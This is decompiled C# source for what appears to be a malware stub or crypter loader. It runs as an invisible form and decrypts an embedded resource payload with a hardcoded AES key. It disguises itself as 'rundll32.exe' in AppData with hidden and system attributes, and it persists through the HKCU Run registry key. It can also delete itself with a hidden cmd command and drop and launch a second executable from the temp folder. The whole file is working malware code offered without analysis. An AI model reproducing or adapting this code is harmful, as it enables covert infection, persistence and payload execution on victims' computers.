using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns2;

namespace ns3;

internal sealed class Form1 : Form
{
	public delegate IntPtr Delegate0(string mn);

	public delegate int Delegate1(IntPtr hm, IntPtr hri);

	public delegate IntPtr Delegate2(IntPtr hm, IntPtr hri);

	public delegate IntPtr Delegate3(IntPtr hm, string ln, string lt);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate4(string appName, StringBuilder commandLine, IntPtr procAttr, IntPtr thrAttr, [MarshalAs(UnmanagedType.Bool)] bool inherit, int creation, IntPtr env, string curDir, byte[] sInfo, IntPtr[] pInfo);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate5(IntPtr hThr, uint[] ctxt);

	private IContainer icontainer_0;

	private string string_0;

	private FileAttributes fileAttributes_0;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		fileAttributes_0 = FileAttributes.Hidden | FileAttributes.System;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(56, 24);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			string text = smethod_1();
			string[] array = Strings.Split(text, "~!LOL!~", -1, (CompareMethod)0);
			string s = Conversions.ToString(smethod_2(array[1], "FuCK"));
			byte[] bytes = Encoding.Default.GetBytes(s);
			string_0 = array[3];
			if (Conversions.ToBoolean(array[2]))
			{
				method_1();
			}
			if (Conversions.ToBoolean(array[4]))
			{
				try
				{
					File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(array[5]))
			{
				method_0();
			}
			if (Conversions.ToBoolean(array[6]))
			{
				string s2 = Conversions.ToString(smethod_2(array[7], "FuCK"));
				byte[] bytes2 = Encoding.Default.GetBytes(s2);
				File.WriteAllBytes(Path.GetTempPath() + "\\" + array[8], bytes2);
				Process.Start(Path.GetTempPath() + "\\" + array[8]);
			}
			Class5.smethod_1(bytes);
			ProjectData.EndApp();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void method_0()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"" + Application.get_ExecutablePath().ToString() + "\"";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		ProjectData.EndApp();
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr FindResource(IntPtr intptr_0, string string_1, string string_2);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

	public static T smethod_0<T>(string string_1, string string_2)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref string_1), ref string_2), typeof(T));
	}

	public static string smethod_1()
	{
		try
		{
			Delegate0 @delegate = smethod_0<Delegate0>("kernel32", "GetModuleHandleA");
			Delegate1 delegate2 = smethod_0<Delegate1>("kernel32", "SizeofResource");
			Delegate2 delegate3 = smethod_0<Delegate2>("kernel32", "LoadResource");
			IntPtr intPtr = @delegate(Application.get_ExecutablePath());
			IntPtr hri = FindResource(intPtr, "0", "FILE_INFO");
			IntPtr source = delegate3(intPtr, hri);
			int num = delegate2(intPtr, hri);
			byte[] array = new byte[checked(num - 1 + 1)];
			Marshal.Copy(source, array, 0, num);
			return Encoding.Default.GetString(array);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void method_1()
	{
		object obj = ((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_CurrentUserApplicationData() + "\\rundll32.exe";
		if (!File.Exists(Conversions.ToString(obj)))
		{
			File.Copy(Application.get_ExecutablePath(), Conversions.ToString(obj));
			File.SetAttributes(Conversions.ToString(obj), fileAttributes_0);
		}
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue(string_0, RuntimeHelpers.GetObjectValue(obj));
	}

	public static object smethod_2(string string_1, string string_2)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(string_2, salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		try
		{
			byte[] array = Convert.FromBase64String(string_1);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			string_1 = Encoding.UTF8.GetString(memoryStream.ToArray());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return string_1;
	}
}
